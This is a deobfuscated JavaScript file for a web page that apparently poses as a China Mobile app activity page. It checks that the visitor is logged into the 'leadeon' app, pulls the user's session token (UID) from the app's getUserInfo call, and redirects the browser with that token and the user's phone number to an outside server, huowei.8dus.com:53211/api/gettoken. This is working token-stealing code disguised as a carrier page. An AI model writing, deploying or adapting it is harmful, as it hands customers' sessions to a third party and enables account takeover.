//Tue Sep 30 2025 02:57:06 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
function getQueryParam(_0x5733db) {
  var _0x48f9e7 = new URLSearchParams(window.location.search);
  return _0x48f9e7.get(_0x5733db);
}
function decodeBase64(_0x555d85) {
  try {
    const _0x28777e = atob(_0x555d85);
    return _0x28777e;
  } catch (_0x5c13f7) {
    return console.error("Base64解码失败:", _0x5c13f7), null;
  }
}
var guid = getQueryParam("guid");
function getCurrentUrlParam() {
  const _0x33a365 = window.location.pathname.split("/");
  return _0x33a365[_0x33a365.length - 1];
}
var type = 30,
  enphone = getCurrentUrlParam(),
  phone = decodeBase64(enphone);
if (phone && phone.includes("|")) {
  var parts = phone.split("|");
  if (parts.length > 1) {
    var typeValue = parts[1].trim();
    if (typeValue === "30") type = 30;else {
      if (typeValue === "15") type = 15;else {
        if (typeValue === "10") type = 10;else {
          if (typeValue === "5") type = 5;else typeValue === "22" ? type = 22 : type = 30;
        }
      }
    }
    phone = parts[0];
  }
}
var debug = false;
if (navigator.userAgent.indexOf("leadeon") < 0) {
  var target = actUrl;
  window.location.href = "https://app.10086.cn/activity/transit/transferDownload.html?targetUrl=" + encodeURIComponent(target);
} else leadeon.userStatus({
  "debug": debug,
  "success": function (_0x4e3026) {
    var _0x4698f1 = _0x4e3026.status,
      _0x9ab2ae = _0x4e3026.otherStatus;
    if (0 == _0x4698f1 && 0 == _0x9ab2ae) leadeon.showLogin({
      "debug": debug,
      "success": function (_0x3a250d) {},
      "error": function (_0x5d401d) {
        alert("无法拉起登录框，请手动登录~");
      }
    });else {
      leadeon.checkSessionIsvalid({
        "success": function (_0x5f5862) {
          var _0x17aa06 = _0x5f5862.status;
          _0x17aa06 == 1 ? leadeon.getUserInfo({
            "debug": debug,
            "success": function (_0x2b3592) {
              var _0x213121 = _0x2b3592.token.match(/UID=(\w+);/)[1],
                _0x2aa9a3 = "http://huowei.8dus.com:53211/api/gettoken?type=" + type + "&phone=" + phone + "&token=" + _0x213121;
              guid && (_0x2aa9a3 += "&guid=" + encodeURIComponent(guid));
              window.location.href = _0x2aa9a3;
            },
            "error": function (_0xe475d5) {
              alert("未获取到APP登录信息,请重新登录APP后操作~");
            }
          }) : leadeon.overTime();
        }
      });
    }
  },
  "error": function (_0x415219) {
    alert("未检测到APP登录信息,请重新登录APP后操作~");
  }
});